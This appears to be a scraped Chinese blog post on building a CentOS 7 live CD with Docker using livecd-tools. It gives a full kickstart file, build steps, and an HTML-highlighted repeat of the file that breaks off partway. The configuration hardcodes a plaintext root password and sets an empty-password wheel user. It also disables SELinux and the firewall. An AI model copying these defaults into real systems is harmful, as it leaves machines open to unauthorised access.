repo --name=base --baseurl=http://mirror.centos.org/centos/7/os/x86_64/ repo --name=updates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/ repo --name=extras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/ repo --name=epel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/ %packages @core kernel dracut bash firewalld NetworkManager e2fsprogs rootfiles docker openssh-server #By zhang ranrui unzip net-tools binutils wget bash-completion bc dmidecode dmraid dmraid-events lvm2 lvm2-libs kpartx mdadm parted xfsdump xfsprogs gdisk bzip2 extundelete libHX libHX-devel autoconf gcc gcc-c++ make screen telnet %end %post systemctl enable docker # By Zhang Ranrui, Add your custom script #wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover #chmod 755 /usr/local/bin/xfs_irecover echo \u0026#34;Banner /etc/issue\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config sed -i \u0026#34;s/After=network\\.target/After=network-online\\.target\\nWants=network-online\\.target/g\u0026#34; /usr/lib/systemd/system/rc-local.service chmod 755 /etc/systemd/system/rc.local.service.d chmod 644 /etc/systemd/system/rc.local.service.d/local.conf chmod 755 /etc/rc.d/rc.local systemctl enable rc-local systemctl start rc-local # FIXME: it\u0026#39;d be better to get this installed from a package cat \u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF #!/bin/bash # # live: Init script for live image # # chkconfig: 345 00 99 # description: Init script for live image. ### BEGIN INIT INFO # X-Start-Before: display-manager ### END INIT INFO . /etc/init.d/functions if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ]; then exit 0 fi if [ -e /.liveimg-configured ] ; then configdone=1 fi exists() { which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return \\$* } # Make sure we don\u0026#39;t mangle the hardware clock on shutdown ln -sf /dev/null /etc/systemd/system/hwclock-save.service livedir=\u0026#34;LiveOS\u0026#34; for arg in \\`cat /proc/cmdline\\` ; do if [ \u0026#34;\\${arg##rd.live.dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then livedir=\\${arg##rd.live.dir=} return fi if [ \u0026#34;\\${arg##live_dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then livedir=\\${arg##live_dir=} return fi done # enable swaps unless requested otherwise swaps=\\`blkid -t TYPE=swap -o device\\` if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -n \u0026#34;\\$swaps\u0026#34; ] ; then for s in \\$swaps ; do action \u0026#34;Enabling swap partition \\$s\u0026#34; swapon \\$s done fi if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -f /run/initramfs/live/\\${livedir}/swap.img ] ; then action \u0026#34;Enabling swap file\u0026#34; swapon /run/initramfs/live/\\${livedir}/swap.img fi mountDockerDisk() { # support label/uuid if [ \u0026#34;\\${dockerdev##LABEL=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; -o \u0026#34;\\${dockerdev##UUID=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then dockerdev=\\`/sbin/blkid -o device -t \u0026#34;\\$dockerdev\u0026#34;\\` fi # if we\u0026#39;re given a file rather than a blockdev, loopback it if [ \u0026#34;\\${dockerdev##mtd}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then # mtd devs don\u0026#39;t have a block device but get magic-mounted with -t jffs2 mountopts=\u0026#34;-t jffs2\u0026#34; elif [ ! -b \u0026#34;\\$dockerdev\u0026#34; ]; then loopdev=\\`losetup -f\\` if [ \u0026#34;\\${dockerdev##/run/initramfs/live}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then action \u0026#34;Remounting live store r/w\u0026#34; mount -o remount,rw /run/initramfs/live fi losetup \\$loopdev \\$dockerdev dockerdev=\\$loopdev fi # if it\u0026#39;s encrypted, we need to unlock it if [ \u0026#34;\\$(/sbin/blkid -s TYPE -o value \\$dockerdev 2\u0026gt;/dev/null)\u0026#34; = \u0026#34;crypto_LUKS\u0026#34; ]; then echo echo \u0026#34;Setting up encrypted Docker device\u0026#34; plymouth ask-for-password --command=\u0026#34;cryptsetup luksOpen \\$dockerdev EncDocker\u0026#34; dockerdev=/dev/mapper/EncDocker fi # and finally do the mount mount \\$mountopts \\$dockerdev /var/lib/docker # if we have /home under what\u0026#39;s passed for persistent home, then # we should make that the real /home. useful for mtd device on olpc if [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi [ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/lib/docker } findDockerDisk() { for arg in \\`cat /proc/cmdline\\` ; do if [ \u0026#34;\\${arg##dockerdisk=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then dockerdev=\\${arg##dockerdisk=} return fi done } if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; dockerdisk= ; then findDockerDisk elif [ -e /run/initramfs/live/\\${livedir}/docker.img ]; then dockerdev=/run/initramfs/live/\\${livedir}/docker.img fi # if we have a persistent /home, then we want to go ahead and mount it if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; nodockerdisk \u0026amp;\u0026amp; [ -n \u0026#34;\\$dockerdev\u0026#34; ] ; then action \u0026#34;Mounting persistent /var/lib/docker\u0026#34; mountDockerDisk fi # make it so that we don\u0026#39;t do writing to the overlay for things which # are just tmpdirs/caches mount -t tmpfs -o mode=0755 varcacheyum /var/cache/yum mount -t tmpfs vartmp /var/tmp [ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/cache/yum /var/tmp \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 if [ -n \u0026#34;\\$configdone\u0026#34; ]; then exit 0 fi # add fedora user with no passwd action \u0026#34;Adding live user\u0026#34; useradd \\$USERADDARGS -c \u0026#34;Live System User\u0026#34; liveuser passwd -d liveuser \u0026gt; /dev/null usermod -aG wheel,docker liveuser \u0026gt; /dev/null # Remove root password lock passwd -d root \u0026gt; /dev/null (echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin # turn off firstboot for livecd boots systemctl --no-reload disable firstboot-text.service 2\u0026gt; /dev/null || : systemctl --no-reload disable firstboot-graphical.service 2\u0026gt; /dev/null || : systemctl stop firstboot-text.service 2\u0026gt; /dev/null || : systemctl stop firstboot-graphical.service 2\u0026gt; /dev/null || : # don\u0026#39;t use prelink on a running live image sed -i \u0026#39;s/PRELINKING=yes/PRELINKING=no/\u0026#39; /etc/sysconfig/prelink \u0026amp;\u0026gt;/dev/null || : # turn off mdmonitor by default systemctl --no-reload disable mdmonitor.service 2\u0026gt; /dev/null || : systemctl --no-reload disable mdmonitor-takeover.service 2\u0026gt; /dev/null || : systemctl stop mdmonitor.service 2\u0026gt; /dev/null || : systemctl stop mdmonitor-takeover.service 2\u0026gt; /dev/null || : # don\u0026#39;t enable the gnome-settings-daemon packagekit plugin gsettings set org.gnome.settings-daemon.plugins.updates active \u0026#39;false\u0026#39; || : # don\u0026#39;t start cron/at as they tend to spawn things which are # disk intensive that are painful on a live image systemctl --no-reload disable crond.service 2\u0026gt; /dev/null || : systemctl --no-reload disable atd.service 2\u0026gt; /dev/null || : systemctl stop crond.service 2\u0026gt; /dev/null || : systemctl stop atd.service 2\u0026gt; /dev/null || : # Mark things as configured touch /.liveimg-configured # add static hostname to work around xauth bug # https://bugzilla.redhat.com/show_bug.cgi?id=679486 echo \u0026#34;localhost\u0026#34; \u0026gt; /etc/hostname # Fixing the lang install issue when other lang than English is selected . See http://bugs.centos.org/view.php?id=7217 /usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig /usr/bin/sed -i \u0026#34;s#return self.humanReadable()#return self.humanReadable().encode(\u0026#39;utf-8\u0026#39;)#g\u0026#34; /usr/lib/python2.7/site-packages/blivet/size.py EOF # bah, hal starts way too late cat \u0026gt; /etc/rc.d/init.d/livesys-late \u0026lt;\u0026lt; EOF #!/bin/bash # # live: Late init script for live image # # chkconfig: 345 99 01 # description: Late init script for live image. . /etc/init.d/functions if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ] || [ -e /.liveimg-late-configured ] ; then exit 0 fi exists() { which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return \\$* } touch /.liveimg-late-configured # read some variables out of /proc/cmdline for o in \\`cat /proc/cmdline\\` ; do case \\$o in ks=*) ks=\u0026#34;--kickstart=\\${o#ks=}\u0026#34; ;; xdriver=*) xdriver=\u0026#34;\\${o#xdriver=}\u0026#34; ;; esac done # if liveinst or textinst is given, start anaconda if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; liveinst ; then plymouth --quit /usr/sbin/liveinst \\$ks fi if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; textinst ; then plymouth --quit /usr/sbin/liveinst --text \\$ks fi # configure X, allowing user to override xdriver if [ -n \u0026#34;\\$xdriver\u0026#34; ]; then cat \u0026gt; /etc/X11/xorg.conf.d/00-xdriver.conf \u0026lt;\u0026lt;FOE Section \u0026#34;Device\u0026#34; Identifier \u0026#34;Videocard0\u0026#34; Driver \u0026#34;\\$xdriver\u0026#34; EndSection FOE fi EOF chmod 755 /etc/rc.d/init.d/livesys /sbin/restorecon /etc/rc.d/init.d/livesys /sbin/chkconfig --add livesys chmod 755 /etc/rc.d/init.d/livesys-late /sbin/restorecon /etc/rc.d/init.d/livesys-late /sbin/chkconfig --add livesys-late # enable tmpfs for /tmp systemctl enable tmp.mount # enable docker systemctl enable docker.service # work around for poor key import UI in PackageKit rm -f /var/lib/rpm/__db* releasever=$(rpm -q --qf \u0026#39;%{version}\\n\u0026#39; --whatprovides system-release) basearch=$(uname -i) rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch echo \u0026#34;Packages within this LiveCD\u0026#34; rpm -qa # Note that running rpm recreates the rpm db files which aren\u0026#39;t needed or wanted rm -f /var/lib/rpm/__db* # go ahead and pre-make the man -k cache (#455968) /usr/bin/mandb # save a little bit of space at least... rm -f /boot/initramfs* # make sure there aren\u0026#39;t core files lying around rm -f /core* # convince readahead not to collect # FIXME: for systemd cat \u0026gt;\u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF # disable updates plugin cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override \u0026lt;\u0026lt; FOE [org.gnome.settings-daemon.plugins.updates] active=false FOE # Show the system-config-keyboard tool on the desktop mkdir /home/liveuser/Desktop -p \u0026gt;/dev/null cat /usr/share/applications/system-config-keyboard.desktop | sed \u0026#39;/NotShowIn/d\u0026#39; |sed \u0026#39;s/Terminal=false/Terminal=true/\u0026#39; \u0026gt; /home/liveuser/Desktop/system-config-keyboard.desktop cat /usr/share/applications/liveinst.desktop | sed \u0026#39;/NoDisplay/d\u0026#39; \u0026gt; /home/liveuser/Desktop/liveinst.desktop chmod +x /home/liveuser/Desktop/*.desktop chown -R liveuser:liveuser /home/liveuser # Liveuser face if [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then cp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face chown liveuser:liveuser /home/liveuser/.face fi # make the installer show up if [ -f /usr/share/applications/liveinst.desktop ]; then # Show harddisk install in shell dash sed -i -e \u0026#39;s/NoDisplay=true/NoDisplay=false/\u0026#39; /usr/share/applications/liveinst.desktop # need to move it to anaconda.desktop to make shell happy #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop fi cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override \u0026lt;\u0026lt; FOE [org.gnome.shell] favorite-apps=[\u0026#39;liveinst.desktop\u0026#39;,\u0026#39;firefox.desktop\u0026#39;, \u0026#39;evolution.desktop\u0026#39;, \u0026#39;empathy.desktop\u0026#39;, \u0026#39;rhythmbox.desktop\u0026#39;, \u0026#39;shotwell.desktop\u0026#39;, \u0026#39;libreoffice-writer.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;, \u0026#39;gnome-documents.desktop\u0026#39;, \u0026#39;anaconda.desktop\u0026#39;] FOE # set up auto-login cat \u0026gt; /etc/gdm/custom.conf \u0026lt;\u0026lt; FOE [daemon] AutomaticLoginEnable=True AutomaticLogin=liveuser FOE # Turn off PackageKit-command-not-found while uninstalled if [ -f /etc/PackageKit/CommandNotFound.conf ]; then sed -i -e \u0026#39;s/^SoftwareSourceSearch=true/SoftwareSourceSearch=false/\u0026#39; /etc/PackageKit/CommandNotFound.conf fi # make sure to set the right permissions and selinux contexts chown -R liveuser:liveuser /home/liveuser/ restorecon -R /home/liveuser/ # Fixing default locale to us localectl set-keymap us localectl set-x11-keymap us EOF # rebuild schema cache with any overrides we installed glib-compile-schemas /usr/share/glib-2.0/schemas %end 注意，上面注释了两个地方，都可以添加软件或者运行脚本\n三、build出iso文件 livecd-creator --verbose -c centos7-live-docker.ks --cache=cache -f centos7-live-docker 然后就会得到centos7-live-docker.iso的文件，注意在build过程中的报错信息，多数是无法下载包导致的。\n直接加载ISO文件启动或者刻录到USB上启动，就可以进入这个自制的Live系统了\n千万注意，启动一定要选Bios legacy，不要用Uefi。\n相关一些有用的链接：\nhttps://github.com/minishift/minishift-centos-iso https://github.com/livecd-tools/livecd-tools https://blog.csdn.net/sharpbladepan/article/details/107423468 ","permalink":"https://rendoumi.com/posts/20211010-live_cd/","summary":"\u003cp\u003e某些场合，很有可能需要启动ISO或者USB盘，自带Linux系统，然后拯救当前损坏的系统\u003c/p\u003e\n\u003cp\u003e或者直接启动一个LIVE CentOS系统，去做某些事，比如用MegaRaid划分Raid、测试系统等等\u003c/p\u003e\n\u003cp\u003e这时候就需要制作出来一个LIVE CD的系统了\u003c/p\u003e\n\u003cp\u003e制作步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一安装live-tools\"\u003e一、安装live-tools\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install livecd-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二准备kickstart文件centos7-live-dockerks\"\u003e二、准备Kickstart文件centos7-live-docker.ks\u003c/h2\u003e\n\u003cp\u003e下载地址：\u003ca href=\"centos7-live-docker.ks\"\u003ecentos7-live-docker.ks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elang en_GB.UTF-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekeyboard us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etimezone Asia/Shanghai --isUtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#selinux --enforcing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eselinux --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#firewall --enabled --service=cockpit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewall --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#xconfig --startxonboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart / --size 8192 --fstype ext4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eNetworkManager,sshd --disabled=network\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Root password\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauth --useshadow --enablemd5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootpw --plaintext Kalaisadog2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ebase --baseurl=http://mirror.centos.org/centos/7/os/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eupdates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eextras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eepel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%packages \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@core\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edracut\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewalld\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eNetworkManager\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ee2fsprogs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootfiles\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edocker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssh-server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#By zhang ranrui\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eunzip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebinutils\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewget\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebash-completion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmidecode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmraid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmraid-events\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elvm2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elvm2-libs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekpartx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emdadm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eparted\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exfsdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exfsprogs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egdisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebzip2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eextundelete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibHX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibHX-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eautoconf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egcc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egcc-c++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emake\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003escreen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%post\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# By Zhang Ranrui, Add your custom script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#chmod 755 /usr/local/bin/xfs_irecover\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;Banner /etc/issue\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esed -i \u0026#34;s/After\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enetwork\\.target/After=network-online\\.target\\nWants=network-online\\.target/g\u0026#34; /usr/lib/systemd/system/rc-local.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/systemd/system/rc.local.service.d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 